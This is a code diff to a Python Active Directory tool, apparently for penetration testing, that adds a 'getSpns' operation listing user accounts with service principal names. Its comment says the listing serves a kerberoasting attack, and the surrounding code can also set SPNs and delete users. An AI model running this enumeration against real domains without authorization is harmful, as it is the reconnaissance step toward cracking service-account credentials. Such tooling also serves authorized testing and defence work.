@@ -89,6 +89,9 @@ class dcDumlu():
             userDn = input('[*] Distinguished Name of User: ')
             self.delUser(c,userDn)
 
+        elif self.operation == "getSpns":
+            self.getSpns(c)
+
         elif self.operation == "setSpn":
             print('[*] Example DN: cn=unsafe inline,cn=Users,'+ self.searchBaseName)
             setSpnDn = input('[*] Distinguished Name: ')
@@ -485,6 +488,26 @@ class dcDumlu():
         else:
             print('[-] ' + userDn + ' is not deleted!')
             print('[!] ' + c.result['message'])
+
+    def getSpns(self, c):
+        #Getting all user SPNs for the kerberoasting attack. The krbtgt account is excluded.
+        total_entries = 0
+        entry_generator = c.extend.standard.paged_search(search_base=self.searchBaseName,
+                                               search_filter='(&(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))(!(sAMAccountName=krbtgt)))',
+                                               search_scope=SUBTREE,
+                                               attributes=['cn', 'sAMAccountName', 'servicePrincipalName'])
+
+        table = PrettyTable(['Name', 'sAMAccountName', 'servicePrincipalName'])
+        table.align = "l"
+        for entry in entry_generator:
+            if 'dn' in entry:
+                table.add_row([entry['attributes']['cn'], entry['attributes']['sAMAccountName'], entry['attributes']['servicePrincipalName']])
+                total_entries += 1
+        if total_entries > 0:
+            print(table)
+            print('[+] Count of SPNs: ', total_entries)
+        else:
+            print('[-] Not found!')
 
     def setSpn(self, c, setSpnDn, spnName):
         c.modify(setSpnDn, {'servicePrincipalName': [(MODIFY_ADD, [spnName])]})
